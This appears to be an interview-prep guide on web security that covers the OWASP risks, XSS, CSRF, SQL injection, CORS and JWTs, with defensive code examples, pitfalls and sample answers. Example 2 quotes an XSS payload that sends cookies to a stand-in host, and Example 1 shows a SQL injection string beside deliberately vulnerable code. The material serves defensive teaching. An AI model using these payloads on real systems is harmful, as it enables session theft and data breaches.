# Web Security

Web security encompasses the practices, protocols, and mechanisms that protect web applications from attacks that exploit vulnerabilities in code, configuration, or architecture. Understanding web security is non-negotiable for any engineer building production systems, as a single vulnerability can expose millions of user records, enable financial fraud, or destroy organizational trust. The OWASP Top 10 provides a widely accepted framework for categorizing the most critical web application security risks, and forms the foundation of most security interview discussions.

---

## Quick Reference

- **XSS (Cross-Site Scripting)** — Injection of malicious scripts into web pages viewed by other users; mitigated by output encoding and Content Security Policy
- **CSRF (Cross-Site Request Forgery)** — Forcing authenticated users to submit unintended requests; mitigated by anti-CSRF tokens and SameSite cookies
- **SQL Injection** — Inserting malicious SQL through unsanitized input; mitigated by parameterized queries and ORM usage
- **Authentication vs Authorization** — Authentication verifies identity; authorization determines access permissions. Conflating these leads to privilege escalation
- **HTTPS/TLS** — Encrypts data in transit; prevents eavesdropping, tampering, and man-in-the-middle attacks
- **Content Security Policy (CSP)** — HTTP header that restricts which resources a browser can load, reducing XSS attack surface
- **CORS (Cross-Origin Resource Sharing)** — Browser mechanism controlling which origins can access your API; misconfiguration exposes APIs to unauthorized domains
- **JWT (JSON Web Tokens)** — Stateless authentication tokens; must be stored securely and validated properly to prevent token forgery
- **Rate Limiting** — Throttles request frequency to prevent brute-force attacks and denial-of-service
- **Input Validation** — Server-side validation of all user input is the first line of defense against injection attacks

---

## When to Use

Security considerations apply to every web application, but certain scenarios demand heightened attention and specific security patterns.

**Apply rigorous security practices when:**

- Building authentication and session management systems where credential theft enables account takeover
- Handling user-generated content that will be rendered in browsers, creating XSS attack vectors
- Designing APIs that accept external input, which may contain injection payloads
- Processing financial transactions where tampering could result in monetary loss
- Storing personally identifiable information (PII) subject to regulatory requirements like GDPR or HIPAA
- Integrating with third-party services where trust boundaries must be explicitly defined
- Building multi-tenant systems where data isolation failures expose one customer's data to another
- Deploying to public cloud infrastructure where misconfigured access controls are the leading cause of breaches

**Security is not a feature you add later.** It must be woven into the design from the start. Retrofitting security into an existing application is orders of magnitude more expensive than building it in from day one. Every code review should include a security lens, and every architecture decision should consider the threat model.

---

## Code Examples

### Example 1: Preventing SQL Injection with Parameterized Queries

```java
// VULNERABLE: String concatenation allows SQL injection
public User findUser(String username) {
    String query = "SELECT * FROM users WHERE username = '" + username + "'";
    // Attacker input: ' OR '1'='1' --
    // Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1' --'
    return jdbcTemplate.queryForObject(query, new UserRowMapper());
}

// SECURE: Parameterized query prevents injection
public User findUserSecure(String username) {
    String query = "SELECT * FROM users WHERE username = ?";
    return jdbcTemplate.queryForObject(query, new UserRowMapper(), username);
}

// SECURE: Using JPA/Hibernate named parameters
@Query("SELECT u FROM User u WHERE u.username = :username")
User findByUsername(@Param("username") String username);
```

The parameterized approach treats user input as data rather than executable SQL. The database driver handles escaping, making it impossible for an attacker to break out of the parameter context regardless of what characters they submit.

### Example 2: XSS Prevention with Output Encoding

```typescript
// VULNERABLE: Directly inserting user content into DOM
function renderComment(comment: string): string {
  return `<div class="comment">${comment}</div>`;
  // Attacker input: <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
}

// SECURE: HTML entity encoding before rendering
function escapeHtml(unsafe: string): string {
  return unsafe
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

function renderCommentSecure(comment: string): string {
  return `<div class="comment">${escapeHtml(comment)}</div>`;
}

// SECURE: React automatically escapes by default
function Comment({ text }: { text: string }) {
  return <div className="comment">{text}</div>; // Safe: React escapes
  // DANGEROUS: <div dangerouslySetInnerHTML={{ __html: text }} /> // Bypasses escaping
}
```

React's JSX automatically escapes interpolated values, which is why `dangerouslySetInnerHTML` exists as an explicit opt-out. Any use of `dangerouslySetInnerHTML` should trigger immediate security review.

### Example 3: CSRF Protection with Token Validation

```java
// Spring Security CSRF configuration
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
                .csrfTokenRequestHandler(new CsrfTokenRequestAttributeHandler())
            )
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            );
        return http.build();
    }
}
```

```typescript
// Frontend: Including CSRF token in requests
async function submitForm(data: FormData): Promise<Response> {
  const csrfToken = document.querySelector('meta[name="csrf-token"]')
    ?.getAttribute('content');

  return fetch('/api/transfer', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken ?? '',
    },
    credentials: 'same-origin',
    body: JSON.stringify(data),
  });
}
```

CSRF tokens work because an attacker on a different origin cannot read the token value. The server generates a unique token per session, embeds it in the page, and validates it on every state-changing request. Without the token, forged cross-origin requests are rejected.

---

## Common Pitfalls

**1. Relying solely on client-side validation.** Client-side checks improve UX but provide zero security. An attacker can bypass any browser-based validation by sending requests directly to your API using curl, Postman, or a custom script. All validation must be duplicated server-side.

**2. Storing sensitive data in localStorage.** localStorage is accessible to any JavaScript running on the page, making it vulnerable to XSS attacks. If an attacker injects a script, they can exfiltrate tokens stored in localStorage. Use httpOnly cookies for session tokens instead, which are inaccessible to JavaScript.

**3. Using symmetric algorithms for JWTs without proper key management.** HMAC-based JWTs (HS256) use a shared secret. If that secret leaks or is weak, anyone can forge valid tokens. For distributed systems, prefer asymmetric algorithms (RS256) where only the auth server holds the private key and services verify with the public key.

**4. Overly permissive CORS configuration.** Setting `Access-Control-Allow-Origin: *` on authenticated endpoints allows any website to make credentialed requests to your API. Always whitelist specific trusted origins and never reflect the Origin header without validation.

**5. Failing to implement rate limiting on authentication endpoints.** Without rate limiting, attackers can attempt millions of password combinations. Implement exponential backoff, account lockout after N failures, and CAPTCHA challenges for suspicious patterns.

**6. Logging sensitive data.** Accidentally logging passwords, tokens, credit card numbers, or PII creates a secondary attack vector. If logs are compromised, all logged secrets are exposed. Implement structured logging with explicit field allowlists.

**7. Not rotating secrets and credentials.** Static API keys, database passwords, and encryption keys accumulate risk over time. Implement automated rotation with tools like HashiCorp Vault or AWS Secrets Manager, and design systems to handle rotation without downtime.

---

## Real-World Use Cases

**E-commerce payment processing:** Payment systems implement multiple security layers including PCI DSS compliance, tokenization of card numbers, 3D Secure authentication, and fraud detection algorithms. The payment form is typically hosted in an iframe from the payment processor's domain, isolating sensitive card data from the merchant's JavaScript context entirely.

**Healthcare data platforms:** HIPAA-regulated systems implement role-based access control with audit logging of every data access, encryption at rest and in transit, automatic session timeout, and break-glass procedures for emergency access. Data is segmented by patient, and cross-patient queries require elevated privileges with mandatory justification.

**Multi-tenant SaaS applications:** Tenant isolation is enforced at the database level (row-level security or separate schemas), the API level (tenant ID validation on every request), and the infrastructure level (separate encryption keys per tenant). A failure in any layer could expose one customer's data to another.

**Banking and financial services:** Financial applications implement transaction signing, mutual TLS for service-to-service communication, hardware security modules (HSMs) for key storage, and real-time anomaly detection. Every transaction is logged immutably for regulatory compliance and forensic analysis.

---

## Interview Questions

**Q: Explain the difference between authentication and authorization. How would you implement both in a microservices architecture?**

A: Authentication verifies who a user is (identity), while authorization determines what they can do (permissions). In microservices, authentication typically happens at the API gateway using OAuth 2.0 or OpenID Connect, producing a JWT that contains identity claims. Authorization is enforced at each service boundary by validating the JWT's claims against the required permissions for the requested resource. Centralized policy engines like Open Policy Agent (OPA) can externalize authorization logic, making it consistent across services without duplicating rules. The key trade-off is between stateless JWTs (fast validation, no revocation until expiry) and opaque tokens with introspection (revocable, but requires network call to auth server).

**Q: How does Content Security Policy (CSP) prevent XSS attacks? What are the challenges of implementing CSP in a large application?**

A: CSP is an HTTP response header that tells the browser which sources of content are trusted. For example, `script-src 'self'` only allows scripts from the same origin, blocking inline scripts and scripts from attacker-controlled domains. Even if an attacker injects a `<script>` tag via XSS, the browser refuses to execute it because the source violates the policy. The challenges in large applications include: legacy code using inline scripts and event handlers that require `'unsafe-inline'` (defeating the purpose), third-party widgets and analytics that need explicit domain allowlisting, dynamically generated content that requires nonces or hashes, and the difficulty of testing CSP in development without breaking functionality. The recommended approach is to deploy in report-only mode first, analyze violations, and tighten the policy incrementally.

**Q: What is the difference between stored XSS, reflected XSS, and DOM-based XSS? Which is most dangerous and why?**

A: Stored XSS persists the malicious payload in the database (e.g., a forum comment containing a script), affecting every user who views the content. Reflected XSS includes the payload in the URL or request parameters, requiring the attacker to trick a victim into clicking a crafted link. DOM-based XSS occurs entirely client-side when JavaScript reads attacker-controlled data (like `location.hash`) and inserts it into the DOM without sanitization. Stored XSS is generally most dangerous because it requires no social engineering after the initial injection, it scales to all users who view the affected content, and it persists until explicitly removed. However, DOM-based XSS can be harder to detect because the payload never reaches the server, bypassing server-side WAF rules and logging.

**Q: How would you design a secure session management system? What are the trade-offs between cookie-based sessions and JWTs?**

A: Cookie-based sessions store a random session ID in an httpOnly, Secure, SameSite cookie, with session data stored server-side (Redis or database). JWTs encode claims directly in the token, eliminating server-side state. Cookie sessions are revocable instantly (delete from store), have smaller payload size, and are immune to client-side token theft via XSS (httpOnly). JWTs are stateless (no shared session store needed), work across domains, and scale horizontally without session affinity. The trade-offs: JWTs cannot be revoked before expiry without maintaining a blacklist (reintroducing state), they grow large with many claims, and if stolen they remain valid. For most applications, short-lived JWTs (15 minutes) paired with httpOnly refresh tokens stored in cookies provide a reasonable balance of statelessness and security.

---

## Production Tips

**Implement defense in depth.** Never rely on a single security control. Layer multiple defenses: input validation at the API boundary, parameterized queries at the data layer, output encoding at the presentation layer, CSP headers as a browser-level backstop, and WAF rules at the network edge. When one layer fails, others contain the blast radius.

**Automate dependency vulnerability scanning.** Use tools like Snyk, Dependabot, or OWASP Dependency-Check in your CI pipeline to detect known vulnerabilities in third-party libraries. Pin dependency versions, review changelogs before upgrading, and have a process for emergency patching when critical CVEs are published. The majority of production breaches exploit known vulnerabilities in unpatched dependencies rather than novel zero-days.

**Implement comprehensive security logging and monitoring.** Log all authentication events (successes and failures), authorization denials, input validation failures, and anomalous patterns. Feed these into a SIEM system with alerting rules for brute-force attempts, impossible travel (login from two distant locations within minutes), and privilege escalation patterns. Without visibility, you cannot detect breaches in progress.

---

## Related Topics

- [Spring Security](../backend/spring-framework/spring-security.md) — Framework-specific implementation of authentication, authorization, and CSRF protection in Java applications
- [System Design](../system-design/system-design/index.md) — Security considerations in distributed system architecture including service-to-service authentication and data encryption strategies
